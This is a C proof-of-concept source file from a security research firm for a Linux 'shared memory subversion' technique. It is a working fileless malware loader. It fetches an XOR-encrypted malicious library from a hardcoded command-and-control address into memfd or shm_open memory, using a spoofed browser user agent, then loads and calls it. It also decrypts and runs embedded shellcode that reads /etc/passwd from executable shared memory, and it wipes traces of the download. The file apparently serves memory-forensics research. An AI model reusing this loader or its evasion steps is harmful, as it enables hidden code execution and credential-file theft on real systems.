// Proof of Concept for the shared memory subversion technique on Linux.
//
//   Copyright (c) 2020, Frank Block, ERNW Research GmbH <fblock@ernw.de>
//
//      All rights reserved.
//
//       Redistribution and use in source and binary forms, with or without modification,
//       are permitted provided that the following conditions are met:
//
//       * Redistributions of source code must retain the above copyright notice, this
//         list of conditions and the following disclaimer.
//       * Redistributions in binary form must reproduce the above copyright notice,
//         this list of conditions and the following disclaimer in the documentation
//         and/or other materials provided with the distribution.
//       * The names of the contributors may not be used to endorse or promote products
//         derived from this software without specific prior written permission.
//
//       THIS SOFTWARE IS PROVIDED BY THE COPYRIGHT HOLDERS AND CONTRIBUTORS "AS IS"
//       AND ANY EXPRESS OR IMPLIED WARRANTIES, INCLUDING, BUT NOT LIMITED TO, THE
//       IMPLIED WARRANTIES OF MERCHANTABILITY AND FITNESS FOR A PARTICULAR PURPOSE
//       ARE DISCLAIMED. IN NO EVENT SHALL THE COPYRIGHT HOLDER OR CONTRIBUTORS BE
//       LIABLE FOR ANY DIRECT, INDIRECT, INCIDENTAL, SPECIAL, EXEMPLARY, OR CONSEQUENTIAL
//       DAMAGES (INCLUDING, BUT NOT LIMITED TO, PROCUREMENT OF SUBSTITUTE GOODS OR
//       SERVICES; LOSS OF USE, DATA, OR PROFITS; OR BUSINESS INTERRUPTION) HOWEVER
//       CAUSED AND ON ANY THEORY OF LIABILITY, WHETHER IN CONTRACT, STRICT LIABILITY,
//       OR TORT (INCLUDING NEGLIGENCE OR OTHERWISE) ARISING IN ANY WAY OUT OF THE USE
//       OF THIS SOFTWARE, EVEN IF ADVISED OF THE POSSIBILITY OF SUCH DAMAGE.

#include <stdio.h>
#include <sys/mman.h>
#include <fcntl.h>
#include <unistd.h>
#include <string.h>
#include <pthread.h>
#include <stdbool.h>
#include <sys/ipc.h>
#include <sys/shm.h>
#include <stdlib.h>
#include <sys/types.h>
#include <linux/memfd.h>
#include <curl/curl.h>
#include <sys/syscall.h>
#include <dlfcn.h>


// #### Following functions are taken from norm-proc.c by Patrick Reichenberger ####

#define MAL_URL "http://192.168.56.1:4443/xor-mallib.so"
#define BEN_URL "http://192.168.56.1:4443/xor-benignlib.so"
#define SHARED_MEM_NAME "/hidden_shared_mem"

// char *mallib_name = "mal_dynlib";
typedef enum {use_shmopen, use_shmget, use_memfd} shared_mem_technique;
typedef enum {use_shellcode, use_library} execution_technique;

static inline int memfd_create(const char *name, unsigned int flags) {
    return syscall(__NR_memfd_create, name, flags);
}

/* Decryption function; simply does a one byte XOR */
void xor(char *plain, size_t size) {
    int key = 0x1a;
    for (int i = 0; i < size; ++i) {
        if (plain[i] != 0x00 && plain[i] != key) {
            plain[i] ^= key;
        }
    }
}

/** write_data - callback for curl write
 *  @ptr: pointer to data
 *  @size: size of element
 *  @nmemb: number of elements (size per element is @size)
 *  @mem_fd: memory file descriptor
 */
size_t write_data (void *ptr, size_t size, size_t nmemb, int mem_fd) {
    /* Decrypt the data */
    xor(ptr, nmemb);
    if (write(mem_fd, ptr, nmemb) < 0) {
        close(mem_fd);
        exit(-1);
    }
    // remove traces from temporary memory, allocated by curl
    memset(ptr, 0, nmemb);
}


// Download our shared object from a C&C via HTTPs (https://x-c3ll.github.io/posts/fileless-memfd_create/)
/** download_to_RAM - download library file and store in memory file
 *  @download: download URL of file
 *  @libname: name of memory file
 *
 *  Download the file from the specified URL and create a memory file where to store the content in.
 *  Could be done via HTTPS, but for testing HTTP is enough.
 *
 *  This function is based on the code of: Juan Manuel Fernández
 *  (see: https://x-c3ll.github.io/posts/fileless-memfd_create/ )
 */
int download_to_RAM(char *url, char* libname, shared_mem_technique technique) {
    CURL *curl;
    CURLcode res;

    int mem_fd = -1;

    /* Create memory file with name specified in parameter libname */
    if (technique == use_shmopen){
        mem_fd = shm_open(libname, O_RDWR | O_CREAT, S_IRUSR | S_IWUSR);

        // TODO hardcoded size, should be fixed
        int return_code = ftruncate(mem_fd, 0x16000);
        if (return_code == -1) {
            perror("ftruncate");
            return -1;
        }
    }

    else if (technique == use_memfd)
        mem_fd = memfd_create(libname, MFD_CLOEXEC);

    if (mem_fd < 0) {
        fprintf(stderr, "Failed to open file descriptor\n");
        exit(-1);
    }
    
    printf("Successfully created shared memory. Now trying to get library...\n");

    /* Download the file and write it to memory file */
    curl = curl_easy_init();
    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url);
//        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYPEER, 0L); // Can be used for HTTPS
//        curl_easy_setopt(curl, CURLOPT_SSL_VERIFYHOST, 0L); // Can be used for HTTPS
        curl_easy_setopt(curl, CURLOPT_USERAGENT, "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36");
        curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, write_data); // Callback
        curl_easy_setopt(curl, CURLOPT_WRITEDATA, mem_fd); // Arguments for callback

        res = curl_easy_perform(curl);
        if (res != CURLE_OK && res != CURLE_WRITE_ERROR) {
            close(mem_fd);
            exit(-1);
        }
        curl_easy_cleanup(curl);
        printf("Library written to shared memory.\n");
    }
    return mem_fd;
}


/** load_lib - load the library from file descriptor
 *  @fd: file descriptor
 *
 *  Dynamically load the file specified in the file descriptor.
 *
 *  This function is based on the code of: Juan Manuel Fernández
 *  (see: https://x-c3ll.github.io/posts/fileless-memfd_create/ )
 */
void *load_lib(int fd) {
    /* Write the path of the file descriptor in the path variable
     * This is needed to call dlopen, which opens the file in memory as a dynamic library.
     */
    char path[128];
    snprintf(path, 128, "/proc/%d/fd/%d", getpid(), fd);

    // Load library
    void *handle = dlopen(path, RTLD_NOW);
    if (!handle) {
        fprintf(stderr, "Error in dlopen: %s\n", dlerror());
    }
    dlerror();    /* Clear any existing error */
    return handle;
}
// #################################################################################


int mal_lib_fd = 0;

int main(int argc, char** argv) {
    char key[] = "t0pSecr3t!";

#ifdef __x86_64__

    // read passwd - http://shell-storm.org/shellcode/files/shellcode-878.php
    // modified:  xor encrypted with t0pSecr3t!  ; removed null byte self xor, so page can be rx ; added token: AAAAAAAAAAAAAAAAAA_what.the.eyes.see.and.the.ears.hear..the.mind.believes_AAAAAAAAAAAAAAAAAA
    // The encryption has only the purpose to prevent any accidental hit.
    // After loaded in memory, the shellcode and the token stay decrypted there.

    // original shellcode: \xeb\x3f\x5f\x80\x77\x0b\x41\x48\x31\xc0\x04\x02\x48\x31\xf6\x0f\x05\x66\x81\xec\xff\x0f\x48\x8d\x34\x24\x48\x89\xc7\x48\x31\xd2\x66\xba\xff\x0f\x48\x31\xc0\x0f\x05\x48\x31\xff\x40\x80\xc7\x01\x48\x89\xc2\x48\x31\xc0\x04\x01\x0f\x05\x48\x31\xc0\x04\x3c\x0f\x05\xe8\xbc\xff\xff\xff\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64\x41
    char shellcode[] = "\x9f\x0f\x2f\xc3\xf5\xf3\xe2\x7b\x45\xe1\x70\x32\x38\x62\x93\x6c\x77\x55\xf5\xcd\x8b\x3f\x38\xde\x51\x47\x3a\xba\xb3\x69\x45\xe2\x16\xe9\x9a\x6c\x3a\x02\xb4\x2e\x71\x78\x41\xac\x25\xe3\xb5\x32\x3c\xa8\xb6\x78\x41\x93\x61\x62\x7d\x36\x3c\x10\xb4\x34\x4c\x5c\x60\x8b\xce\xcc\x8b\xde\x5b\x55\x04\x30\x4a\x13\x13\x40\x07\x56\x10\x30\x31\x12\x24\x22\x33\x72\x35\x60\x35\x71\x31\x12\x24\x22\x33\x72\x35\x60\x2b\x47\x18\x32\x11\x4d\x06\x5b\x11\x0f\x11\x49\x15\x20\x4b\x10\x17\x56\x5a\x40\x1a\x54\x5e\x27\x0d\x06\x5c\x56\x15\x53\x07\x1e\x18\x36\x04\x11\x5c\x1d\x00\x49\x11\x1e\x1d\x3a\x0b\x07\x5c\x51\x11\x4d\x1d\x55\x06\x36\x16\x3c\x33\x72\x35\x60\x35\x71\x31\x12\x24\x22\x33\x72\x35\x60\x35\x71\x31\x12\x65";

    printf("Loading x86_64 shellcode...\n\n");
#else
    // read passwd - http://shell-storm.org/shellcode/files/shellcode-842.php
    // modified: xor encrypted with t0pSecr3t!   ; added token: AAAAAAAAAAAAAAAAAA_what.the.eyes.see.and.the.ears.hear..the.mind.believes_AAAAAAAAAAAAAAAAAA
    // The encryption has only the purpose to prevent any accidental hit.
    // After loaded in memory, the shellcode and the token stay decrypted there.
    // original shellcode: \x31\xc9\xf7\xe1\xb0\x05\x51\x68\x73\x73\x77\x64\x68\x63\x2f\x70\x61\x68\x2f\x2f\x65\x74\x89\xe3\xcd\x80\x93\x91\xb0\x03\x31\xd2\x66\xba\xff\x0f\x42\xcd\x80\x92\x31\xc0\xb0\x04\xb3\x01\xcd\x80\x93\xcd\x80
    char shellcode[] = "\x45\xf9\x87\xb2\xd5\x66\x23\x5b\x07\x52\x03\x54\x18\x30\x4a\x13\x13\x5b\x5b\x0e\x11\x44\xf9\xb0\xa8\xe3\xe1\xa2\xc4\x22\x45\xe2\x16\xe9\x9a\x6c\x30\xfe\xf4\xb3\x45\xf0\xc0\x57\xd6\x62\xbf\xb3\xe7\xec\xf4\x71\x31\x12\x24\x22\x33\x72\x35\x60\x35\x71\x31\x12\x24\x22\x33\x72\x35\x7e\x03\x58\x11\x27\x4b\x17\x1a\x56\x5a\x44\x0d\x55\x03\x7d\x16\x06\x17\x1d\x15\x4f\x10\x1e\x04\x3b\x00\x4d\x17\x52\x06\x52\x5a\x58\x15\x32\x17\x4d\x5c\x47\x1c\x44\x5a\x5d\x19\x3d\x01\x4d\x10\x56\x18\x48\x11\x46\x15\x20\x3a\x22\x33\x72\x35\x60\x35\x71\x31\x12\x24\x22\x33\x72\x35\x60\x35\x71\x31\x53";
    printf("Loading i386 shellcode...\n\n");
#endif

    bool debug = false;
    int current_sharedmem_technique = use_shmopen;
    int current_exec_technique = use_shellcode;

    if (argc > 1){
        if (strcmp(argv[1], "use_shmget") == 0)
            current_sharedmem_technique = use_shmget;

        else if (strcmp(argv[1], "use_memfd") == 0)
            current_sharedmem_technique = use_memfd;

        if (argc > 2 && strcmp(argv[2], "use_library") == 0){
            if (current_sharedmem_technique == use_shmget){
                printf("System V and library loading are not supported together.\n");
                exit(-1);
            }
            current_exec_technique = use_library;
	    }

        if (argc > 3 && strcmp(argv[3], "debug") == 0)
            debug = true;
    }

    int shellcode_size = sizeof(shellcode)-1;
    size_t memsize = shellcode_size*10;
    int return_code = 0;
    int fd = -1;
    void* shared_mem = 0;
    void *mal_lib_handle;
    void (*mal_lib_func)(void);
    key_t SHARED_SHMEM_KEY;
    SHARED_SHMEM_KEY = 123447;
    pthread_t t1;
    void *s;
    void* (*shellcode_func)(void *);
    char c, r = 'c';
    int i = 0;
    int keysize = sizeof(key) - 1;

    if (current_exec_technique == use_library){
        printf("We are going to load a library for execution.\n");
        if (current_sharedmem_technique == use_memfd){
            printf("We are going to use memfd for creating a shared memory segment.\n");
            mal_lib_fd = download_to_RAM(MAL_URL, SHARED_MEM_NAME, current_sharedmem_technique);
            // mal_lib_handle = install_lib(MAL_URL, SHARED_MEM_NAME);
        }
        else if (current_sharedmem_technique == use_shmopen){
            printf("We are going to use shmopen for creating a shared memory segment.\n");
            mal_lib_fd = download_to_RAM(MAL_URL, SHARED_MEM_NAME, current_sharedmem_technique);
        }

        if (mal_lib_fd < 0){
            printf("Error during library loading.\n");
            exit(-1);
        }

        printf("Library has been fetched from the server and decrypted, but not yet mapped into the process space.\n\n");

    }
    else if (current_exec_technique == use_shellcode){
        printf("We are going to use shellcode for execution.\n");
        if (current_sharedmem_technique == use_shmopen){
            printf("We are going to use shm_open/mmap.\n");
            fd = shm_open(SHARED_MEM_NAME, O_RDWR | O_CREAT, S_IRUSR | S_IWUSR);
            if (fd == -1) {
                perror("open");
                return 10;
            }
        }
        else if (current_sharedmem_technique == use_shmget){
            printf("We are going to use shmget/shmat.\n");
            if ((fd = shmget(SHARED_SHMEM_KEY, memsize, IPC_CREAT | 0700)) < 0) {
                perror("shmget");
                exit(1);
            }

            if ((shared_mem = shmat(fd, NULL, 0)) == (char *) -1) {
                perror("shmat");
                exit(1);
            }
        }

        else if (current_sharedmem_technique == use_memfd){
            printf("We are going to use memfd/mmap.\n");
            fd = memfd_create(SHARED_MEM_NAME, MFD_CLOEXEC);
            if (fd == -1) {
                perror("open");
                return 10;
            }
        }

        if (current_sharedmem_technique == use_shmopen || current_sharedmem_technique == use_memfd){
            return_code = ftruncate(fd, memsize);
            if (return_code == -1) {
                perror("ftruncate");
                return 20;
            }

            shared_mem = mmap(NULL, shellcode_size, PROT_READ|PROT_WRITE, MAP_SHARED, fd, 0);
            if (shared_mem == MAP_FAILED) {
                perror("mmap");
                return 30;
            }
        }

        printf("Shared memory created and mapped at: %p. Now copying shellcode to it.\n", shared_mem);

        memcpy(shared_mem, shellcode, shellcode_size);

        printf("Shellcode copied, starting to decrypt...\n");

        for (i=0; i<shellcode_size; i++)
            ((char*)shared_mem)[i] = ((char*)shared_mem)[i] ^ key[i%keysize];

        if (debug){
            printf("Shellcode copied.\n");
            printf("Shellcode size: %d\n", shellcode_size);
            printf("Decrypted %d bytes.\n", i);
            char* token_pointer = (char*)(shared_mem + shellcode_size - 93);
            printf("Reading token in shellcode at %p: %s\n", token_pointer, token_pointer);
        }

        if (current_sharedmem_technique == use_shmopen || current_sharedmem_technique == use_memfd)
            return_code = munmap(shared_mem, shellcode_size);

        else if (current_sharedmem_technique == use_shmget)
            return_code = shmdt(shared_mem);


        if (return_code == -1) {
            perror("munmap");
            return 40;
        }

        printf("Shellcode has been copied to a shared segment, decrypted and finally unmapped.\n\n");
        
    }

    printf("Memory is currently unmapped. Press enter to start the loop and map the malicious memory.\n");
    while (getchar() != '\n');

    while (c != 'q'){
        if (current_exec_technique == use_library){
            if (current_sharedmem_technique == use_shmopen || current_sharedmem_technique == use_memfd){
                //shared_mem = mmap(NULL, shellcode_size, PROT_READ|PROT_EXEC, MAP_SHARED, fd, 0);
                mal_lib_handle = load_lib(mal_lib_fd);
                if (shared_mem == MAP_FAILED) {
                    perror("mmap");
                    return 30;
                }
                printf("Library reloaded.\n");
            }
        }

        else if (current_exec_technique == use_shellcode){
            if (current_sharedmem_technique == use_shmopen || current_sharedmem_technique == use_memfd){
                //shared_mem = mmap(NULL, shellcode_size, PROT_READ|PROT_EXEC, MAP_SHARED, fd, 0);
                shared_mem = mmap(NULL, shellcode_size, PROT_READ|PROT_WRITE|PROT_EXEC, MAP_SHARED, fd, 0);
            }

            else if (current_sharedmem_technique == use_shmget){
                //if ((shared_mem = shmat(fd, NULL, SHM_RDONLY|SHM_EXEC)) == (char *) -1) {
                if ((shared_mem = shmat(fd, NULL, SHM_EXEC)) == (char *) -1) {
                    perror("shmat");
                    exit(1);
                }
            }

            printf("Memory mapped at %p but not yet read... enter to read\n", shared_mem);
            while (getchar() != '\n');

            r = *((char*) shared_mem);

            printf("Memory read.\n");
        }

        
        printf("Enter to execute\n");
        while (getchar() != '\n');

        if (current_exec_technique == use_library){
            /* Obtain the address of the function from the malicious library */
            *(void **)(&mal_lib_func) = dlsym(mal_lib_handle, "malicious_print");
            printf("Executing the library function at %p.\n\n", mal_lib_func);
            (*mal_lib_func)();
            printf("\n");
        }
        else if (current_exec_technique == use_shellcode){
            shellcode_func = (void* (*)(void *)) shared_mem;
            printf("Executing shellcode at %p.\n", shellcode_func);

            pthread_create(&t1, NULL, shellcode_func, NULL);
            pthread_join(t1, &s);
        }

        printf("Executed... enter to unmap\n");
        while (getchar() != '\n');

        if (current_exec_technique == use_library)
            dlclose(mal_lib_handle);
            
        else if (current_exec_technique == use_shellcode){
            if (current_sharedmem_technique == use_shmopen || current_sharedmem_technique == use_memfd){
                return_code = munmap(shared_mem, shellcode_size);
                if (return_code == -1) {
                    perror("munmap");
                    return 40;
                }
            }
            else if (current_sharedmem_technique == use_shmget)
                shmdt(shared_mem);
        }
        // TODO check if lib is still mapped
        printf("Memory unmapped.\n");
        printf("Enter q to quit or just enter to restart the loop...\n");
        c = getchar();
    }
    getchar();
    printf("Press enter to unlink\n");
    while (getchar() != '\n');
    
    if (current_sharedmem_technique == use_shmopen){
        return_code = shm_unlink(SHARED_MEM_NAME);
        if (return_code == -1) {
            perror("unlink");
            return 60;
        }
    }
    else if (current_sharedmem_technique == use_shmget)
        shmctl(fd,IPC_RMID,NULL);

    // memfd_create is set to close on exit, so nothing to do in that case

    printf("Memory unlinked (except memfd)... enter to finish\n");
    while (getchar() != '\n');
    return 0;
}
